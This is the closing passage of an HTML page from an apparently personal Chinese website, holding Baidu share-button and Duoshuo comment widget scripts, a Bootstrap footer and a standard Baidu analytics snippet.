	"likeText":"赞!",
	"likedText":"已赞!"
};
document.getElementById("bdlike_shell").src="http://bdimg.share.baidu.com/static/js/like_shell.js?t=" + Math.ceil(new Date()/3600000);
</script>

<br>
<div id="bdshare" class="bdshare_t bds_tools get-codes-bdshare">
<span class="bds_more">分享给小伙伴：</span>
<a class="bds_tsina"></a>
<a class="bds_qzone"></a>
<a class="bds_tqq"></a>
<a class="bds_renren"></a>
<a class="shareCount"></a>
</div>
<script type="text/javascript" id="bdshare_js" data="type=tools&amp;uid=2966522" ></script>
<script type="text/javascript" id="bdshell_js"></script>
<script type="text/javascript">
document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000)
</script>
<!-- Baidu Button END -->

<!-- Duoshuo Comment BEGIN -->
  <div class="ds-thread"></div>
<script type="text/javascript">
var duoshuoQuery = {short_name:"treeforests"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = 'http://static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0] 
    || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>
<!-- Duoshuo Comment END -->

      </div>

      <div id="push"></div>
    </div>

    <div id="footer">
      <div class="container">
        <p class="muted credit">Designed and Powered By <a href="mailto:wssgcg1213@qq.com">6x0</a> using  Bootstrap. </p>
      </div>
    </div>



    <!-- Le javascript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
   <script src="http://wssgcg1213.qiniudn.com/bootstrap.min.js"></script>
   <script src="http://wssgcg1213.qiniudn.com/jquery.min.js"></script>
 <div  style='display:none'> <script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F1c24eb48133c8582b4c1e8c6460a73ec' type='text/javascript'%3E%3C/script%3E"));
</script>
</div>
  </body>
</html>
















